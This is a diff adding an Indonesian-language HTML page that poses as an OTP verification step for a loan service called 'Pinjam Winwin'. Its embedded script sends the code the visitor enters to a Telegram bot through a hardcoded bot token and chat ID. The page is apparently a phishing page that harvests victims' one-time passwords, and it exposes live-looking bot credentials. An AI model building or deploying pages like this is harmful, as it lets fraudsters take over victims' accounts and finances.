@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="darkblue">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            position: relative;
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0px;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
+
+        #otp-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 13px;
+            z-index: 9999;
+            font-weight: bold;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 60px auto 40px;
+            width: 300px;
+        }
+
+        .otp-input {
+            width: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: none;
+            border-bottom: 2px solid #000080;
+            outline: none;
+            background-color: transparent;
+            margin-right: 10px; /* Menambah jarak antar kolom */
+        }
+
+        .otp-input:last-child {
+            margin-right: 0; /* Menghilangkan margin kanan pada kolom terakhir */
+        }
+
+        #resend-timer {
+            color: #888;
+            margin: 10px 0;
+            text-align: left;
+            padding-left: 8%;
+            margin-top: -25px;
+            font-size: 13px;
+        }
+
+        #resend-link {
+            color: #000080;
+            text-decoration: none;
+            cursor: not-allowed;
+            margin-top: 13px;
+        }
+
+        #resend-link.active {
+            cursor: pointer;
+        }
+
+        #submit-btn {
+            width: 80%;
+            padding: 14px;
+            font-size: 13px;
+            background-color: #ddd;
+            border: none;
+            border-radius: 12px;
+            cursor: not-allowed;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        #submit-btn.active {
+            background-color: #000080;
+            cursor: pointer;
+        }
+        
+        .blue-text {
+            color: black;
+            font-size: 15px;
+            margin-right: -8px;
+            margin-left: -90px;
+            font-weight: bold;
+        }
+
+        #error-message {
+            display: none;
+            color: red;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="gambar">
+        <img src="https://raw.githubusercontent.com/Pinj4manwinwin/Pinj4manwinwin.github.io/main/1723904551711.jpg" alt="Gambar Pucok">
+    </div>
+    <p class="right-align blue-text">Kode OTP Sudah Berhasil Dikirim</p>
+    <div id="otp-message">OTP Berhasil Dikirim</div>
+    <div class="otp-inputs">
+        <input type="tel" maxlength="1" class="otp-input" id="digit-1">
+        <input type="tel" maxlength="1" class="otp-input" id="digit-2">
+        <input type="tel" maxlength="1" class="otp-input" id="digit-3">
+        <input type="tel" maxlength="1" class="otp-input" id="digit-4">
+    </div>
+    <p id="resend-timer">Kirim ulang dalam <span id="countdown">60</span> detik</p>
+    <p><a href="#" id="resend-link">Tidak bisa menerima kode verifikasi?</a></p>
+    <button id="submit-btn" disabled>Lanjutkan</button>
+    <p id="error-message">Kode OTP Salah</p>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpMessage = document.getElementById('otp-message');
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const submitBtn = document.getElementById('submit-btn');
+            const resendLink = document.getElementById('resend-link');
+            const countdown = document.getElementById('countdown');
+            const errorMessage = document.getElementById('error-message');
+            let timer = 60;
+            let resendInterval;
+            const correctOTP = "1234"; // Ganti dengan nilai OTP yang benar
+
+            // Menampilkan pesan OTP sebagai pop-up dan menghilangkannya setelah 2 detik
+            otpMessage.style.display = 'block';
+            setTimeout(() => {
+                otpMessage.style.display = 'none';
+            }, 2000);
+
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    // Secara otomatis berpindah ke input berikutnya
+                    if (input.value.length > 0 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                    // Memeriksa apakah semua input sudah terisi
+                    let allFilled = true;
+                    otpInputs.forEach(i => {
+                        if (i.value === '') {
+                            allFilled = false;
+                        }
+                    });
+
+                    // Mengaktifkan tombol submit jika semua input terisi
+                    if (allFilled) {
+                        submitBtn.classList.add('active');
+                        submitBtn.disabled = false;
+                    } else {
+                        submitBtn.classList.remove('active');
+                        submitBtn.disabled = true;
+                    }
+                });
+            });
+
+            // Fungsi untuk mengirim OTP ke bot Telegram menggunakan AJAX
+            function sendOTPToTelegram(otp) {
+                const botToken = 'YOUR_BOT_TOKEN'; // Ganti dengan Bot Token Anda
+                const chatID = 'YOUR_CHAT_ID'; // Ganti dengan Chat ID Anda
+                const message = `Kode OTP-Pinjam Winwin ${otp}`;
+
+                const url = `https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage?chat_id=6824078885&text=${encodeURIComponent(message)}`;
+
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.send();
+            }
+
+            // Mencegah submit jika semua input belum terisi dan mengirimkan OTP ke Telegram
+            submitBtn.addEventListener('click', function(e) {
+                if (submitBtn.disabled) {
+                    e.preventDefault();
+                } else {
+                    const otp = Array.from(otpInputs).map(input => input.value).join('');
+                    if (otp === correctOTP) {
+                        sendOTPToTelegram(otp);
+                        alert('');
+                    } else {
+                        errorMessage.style.display = 'block';
+                    }
+                }
+            });
+
+            // Fungsi untuk hitung mundur resend OTP
+            function startCountdown() {
+                resendInterval = setInterval(() => {
+                    timer--;
+                    countdown.textContent = timer;
+                    if (timer === 0) {
+                        clearInterval(resendInterval);
+                        resendLink.classList.add('active');
+                        resendLink.style.cursor = 'pointer';
+                        resendLink.addEventListener('click', resendOTP);
+                        countdown.textContent = 'Sekarang';
+                    }
+                }, 1000);
+            }
+
+            // Fungsi untuk resend OTP
+            function resendOTP() {
+                timer = 60;
+                countdown.textContent = timer;
+                resendLink.classList.remove('active');
+                resendLink.style.cursor = 'not-allowed';
+                resendLink.removeEventListener('click', resendOTP);
+                startCountdown();
+                alert('Kode OTP telah dikirim ulang.');
+            }
+
+            startCountdown();
+        });
+    </script>
+</body>
+</html>
